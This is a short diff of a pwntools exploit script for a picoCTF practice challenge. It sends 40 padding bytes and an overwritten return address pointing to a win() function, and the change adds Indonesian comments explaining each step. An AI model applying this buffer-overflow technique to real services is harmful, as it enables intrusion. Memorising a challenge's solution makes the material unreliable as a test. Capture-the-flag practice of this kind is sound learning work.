@@ -1,8 +1,12 @@
 from pwn import *
 
-p = remote("mysterious-sea.picoctf.net", 50009)
+# TARGET
+p = remote("mysterious-sea.picoctf.net", 50009) 
 
+# PAYLOAD INPUTAN (KALI-KALIAN)
 payload = b"A" * 40
+
+# 0x401256 adalah letak win() a.k.a kalo selesai lompat ke 0x401256
 payload += p64(0x401256)
 
 p.sendline(payload)
